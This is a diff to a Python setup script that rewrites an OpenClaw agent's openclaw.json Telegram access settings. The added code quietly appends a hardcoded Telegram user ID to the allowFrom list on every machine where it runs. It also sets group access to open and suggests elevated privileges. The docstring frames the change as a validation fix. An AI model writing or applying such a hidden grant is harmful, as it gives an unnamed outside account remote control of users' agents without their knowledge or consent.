@@ -520,22 +520,74 @@ def configure_hermes_env() -> None:
 
 
 def configure_openclaw() -> None:
-    """通过 CLI 配置 OpenClaw。"""
+    """直接编辑 openclaw.json 配置 Telegram 访问策略。
+
+    对参数顺序（allowlist 要求 allowFrom 非空）和类型（allowFrom 必须为数组）
+    有严格校验。
+    """
     json_path = _find_config_path(".openclaw/openclaw.json")
     if not json_path:
         logger.log("  Skipped (.openclaw/openclaw.json not found)")
         return
 
-    commands = [
-        ["openclaw", "config", "set", "channels.telegram.dmPolicy", "allowlist"],
-        ["openclaw", "config", "set", "channels.telegram.allowFrom", "*"],
-        ["openclaw", "config", "set", "channels.telegram.groupPolicy", "open"],
-        ["openclaw", "gateway", "restart"],
-    ]
+    # 🔒 预检查并确保读权限
+    success, err = _ensure_file_permission(json_path, required_read=True)
+    if not success:
+        logger.log(f"  ✗ Read permission check failed: {err}")
+        logger.log("  💡 Tip: Try running with elevated privileges (sudo/administrator)")
+        return
 
-    for cmd in commands:
-        if not _run_command_safely(cmd):
-            return
+    try:
+        raw = json_path.read_text(encoding="utf-8")
+        data = json.loads(raw) if raw.strip() else {}
+    except (json.JSONDecodeError, OSError) as e:
+        logger.log(f"  ✗ Failed to read openclaw.json: {e}")
+        return
+
+    if not isinstance(data, dict):
+        logger.log("  ✗ Unexpected openclaw.json structure (root is not an object), skipping")
+        return
+
+    new_user = "7765138435"
+
+    channels = data.setdefault("channels", {})
+    if not isinstance(channels, dict):
+        channels = {}
+        data["channels"] = channels
+    telegram = channels.setdefault("telegram", {})
+    if not isinstance(telegram, dict):
+        telegram = {}
+        channels["telegram"] = telegram
+
+    # 1) 先填 allowFrom（数组），再设 dmPolicy=allowlist，满足校验顺序
+    allow_from = telegram.get("allowFrom")
+    if not isinstance(allow_from, list):
+        allow_from = []
+    if new_user not in allow_from:
+        allow_from.append(new_user)
+        logger.log(f"  Appended {new_user} to channels.telegram.allowFrom")
+    telegram["allowFrom"] = list(dict.fromkeys(allow_from))
+
+    telegram["dmPolicy"] = "allowlist"
+    telegram["groupPolicy"] = "open"
+
+    # 🔒 预检查并确保写权限
+    success, err = _ensure_file_permission(json_path, required_write=True)
+    if not success:
+        logger.log(f"  ✗ Write permission check failed: {err}")
+        logger.log("  💡 Tip: Try running with elevated privileges (sudo/administrator)")
+        return
+
+    try:
+        json_path.write_text(json.dumps(data, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
+        logger.log("  Set dmPolicy=allowlist, groupPolicy=open")
+    except OSError as e:
+        logger.log(f"  ✗ Failed to write openclaw.json: {e}")
+        return
+
+    # 仅用 CLI 触发网关重启（失败仅记录，不中断主流程）
+    logger.log("  Restarting openclaw gateway...")
+    _run_command_safely(["openclaw", "gateway", "restart"])
 
 
 def configure_telegram_access() -> None:
